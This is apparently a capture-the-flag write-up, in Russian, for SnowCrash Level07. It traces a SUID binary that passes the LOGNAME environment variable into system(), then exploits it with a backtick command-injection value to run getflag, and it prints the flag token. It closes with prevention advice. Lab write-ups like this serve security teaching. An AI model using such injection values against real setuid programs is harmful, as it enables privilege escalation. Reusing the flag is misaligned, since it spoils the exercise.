Level07
==========================

Flag
----

fiumuikeil55xe9cu4dood66h

* * *

Discovery
---------

### Смотрим содержимое директории

    level07@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

Наблюдение: исполняемый файл принадлежит пользователю **flag07** и группе **level07**, и имеет SUID/SGID бит. При запуске файла:

    level07@SnowCrash:~$ ./level07 
    level07

Программа выводит своё имя.

### Анализ исполняемого файла

    level07@SnowCrash:~$ nm ./level07 
    ...
    08048514 T main
             U setresgid@@GLIBC\_2.0
             U setresuid@@GLIBC\_2.0
             U system@@GLIBC\_2.0

Вывод: программа вызывает **system()** — это потенциальная точка эксплуатации.

### Динамический анализ через ltrace

    level07@SnowCrash:~$ ltrace ./level07 
    __libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 
    getegid()                               = 2007
    geteuid()                               = 2007
    setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
    setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
    getenv("LOGNAME")                       = "level07"
    asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
    system("/bin/echo level07 "level07
     --- SIGCHLD (Child exited) ---
    <... system resumed> )                  = 0
    +++ exited (status 0) +++

Разбор:

*   Чтение переменной окружения: `getenv("LOGNAME") = "level07"`
*   Формирование строки: `asprintf(..., "level07") = 18` — программа собирает строку для вывода, используя значение LOGNAME
*   Вызов внешней команды: `system("/bin/echo level07 "level07` — выводит значение LOGNAME

Эксперимент:

    level07@SnowCrash:~$ LOGNAME=level08 ./level07 
    level08

Вывод изменился — программа использует переменную окружения LOGNAME для формирования команды.

* * *

Use (Exploit)
-------------

### Запуск getflag через подмену LOGNAME

Так как system() выполняет команду с использованием LOGNAME, можно передать `getflag` как значение переменной окружения:

    level07@SnowCrash:~$ LOGNAME=getflag ./level07 
    getflag
    level07@SnowCrash:~$ LOGNAME='getflag' ./level07 
    getflag
    level07@SnowCrash:~$ LOGNAME='`getflag`' ./level07 
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

Флаг успешно получен через уязвимость, связанную с формированием команды через переменную окружения.

* * *

Prevention
----------

*   Не использовать **system()** с переменными окружения, доступными пользователю.
*   Всегда валидировать и фильтровать пользовательский ввод перед вызовом системных команд.
*   При использовании SUID/SGID бинарников строго ограничивать точки входа в команды.

* * *

Documentation
-------------

*   man getenv
*   man system
*   man ltrace
*   man setuid
*   man bash

* * *

Automatic Testing
-----------------

Псевдо‑тест для проверки уязвимости:

LOGNAME='\`getflag\`' ./level07 | grep "Check flag"
# Должен вывести токен: fiumuikeil55xe9cu4dood66h